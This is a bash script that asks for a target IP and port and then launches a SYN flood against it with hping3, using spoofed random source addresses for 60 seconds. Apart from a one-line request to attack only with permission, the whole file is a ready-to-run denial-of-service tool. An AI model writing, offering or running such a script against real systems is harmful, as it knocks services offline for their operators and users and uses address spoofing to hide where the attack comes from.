#!/bin/bash

ask_input() {
  read -p "Enter the target IP: " target_ip
  read -p "Enter the target port: " target_port
}

syn_flood() {
  timeout=60
  trap 'echo "Attack stopped by user."; exit 0' INT
  echo "Starting SYN flood attack against $target_ip:$target_port for $timeout seconds."
  time sudo hping3 --flood -S -c 9999999999 --rand-source $target_ip -p $target_port &
  pid=$!
  sleep $timeout || wait $pid
  kill -9 $pid 2>/dev/null
  echo "Attack finished."
}

check_input() {
  if [[ -z $target_ip || -z $target_port ]]; then
    echo "Invalid input. Please try again."
    ask_input
    check_input
  fi
}

echo "This script will perform a SYN flood attack using hping3."
echo "Please be careful and ethical when using this script and do not attack any servers without permission."
ask_input
check_input
syn_flood
